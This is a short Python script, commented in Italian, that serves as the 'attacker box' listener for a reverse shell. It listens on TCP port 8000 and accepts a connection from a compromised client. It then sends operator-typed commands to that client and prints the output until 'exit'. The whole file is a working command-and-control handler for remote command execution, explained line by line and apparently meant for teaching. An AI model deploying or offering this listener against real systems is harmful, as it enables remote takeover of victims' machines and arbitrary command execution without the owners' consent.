from socket import *  # Importa tutte le funzioni e costanti dal modulo socket per la comunicazione TCP/IP

# Imposta la porta su cui il server sarà in ascolto
serverPort = 8000

# Crea una socket TCP IPv4
serverSocket = socket(AF_INET, SOCK_STREAM)

# Imposta l'opzione SO_REUSEADDR per permettere il riutilizzo della porta dopo la chiusura
serverSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)

# Collega la socket all'indirizzo locale e alla porta specificata
# '' significa che il server ascolta su tutte le interfacce disponibili
serverSocket.bind(('', serverPort))

# Mette la socket in modalità di ascolto; accetta al massimo 1 connessione pendente
serverSocket.listen(1)

print("Attacker box listening and awaiting instructions")  # Messaggio di conferma che il server è in ascolto

# Accetta una connessione entrante; blocca finché un client non si connette
connectionSocket, addr = serverSocket.accept()
print("Thanks for connecting to me " + str(addr))  # Stampa l'indirizzo IP del client connesso

# Riceve il messaggio iniziale inviato dal client (es. messaggio di benvenuto)
message = connectionSocket.recv(1024).decode()
print(message)  # Visualizza il messaggio ricevuto

# Inizializza la variabile per i comandi da inviare al client
command = ""

# Loop principale: continua a inviare comandi finché non si inserisce "exit"
while command != "exit":
    # Chiede all'operatore di inserire un comando da inviare al client
    command = input("Please enter a command: ")
    
    # Se il comando è "exit", esce dal ciclo
    if command == "exit":
        break
    
    # Invia il comando al client (codificato in UTF-8)
    connectionSocket.send(command.encode())
    
    # Riceve la risposta del client all'esecuzione del comando
    try:
        message = connectionSocket.recv(2048).decode()
        print(message)  # Stampa l'output restituito dal client
    except Exception as e:
        # Gestisce eventuali errori durante la ricezione della risposta
        print("Errore nella ricezione del messaggio: ", e)
        break

# Alla fine del ciclo (quando si esce con "exit"), chiude ordinatamente la connessione
connectionSocket.shutdown(SHUT_RDWR)  # Interrompe la comunicazione in entrambe le direzioni
connectionSocket.close()  # Chiude fisicamente la socket

